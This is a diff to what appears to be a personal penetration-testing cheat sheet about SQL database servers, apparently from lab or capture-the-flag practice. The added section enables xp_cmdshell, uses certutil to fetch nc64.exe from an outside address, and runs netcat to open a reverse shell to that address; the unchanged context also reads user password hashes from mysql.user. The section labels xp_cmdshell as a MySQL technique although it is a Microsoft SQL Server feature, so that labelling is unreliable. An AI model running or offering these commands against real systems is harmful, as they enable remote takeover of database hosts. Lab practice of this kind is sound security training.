@@ -1,3 +1,5 @@
+__tags: mysql technique
+
 ## login with password
 
 ```
@@ -48,4 +50,17 @@ select user, password, host from mysql.user;
 
 show events;
 
+```
+
+## Use `enable_xp_cmdshell` to run commands from sql
+```bash
+## login to mysql server as sa
+enable_xp_cmdshell
+xp_cmdshell whoami
+EXEC xp_cmdshell
+
+EXEC xp_cmdshell 'certutil -urlcache -split -f
+http://10.10.14.9:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
+
+EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.9 4455';
 ```
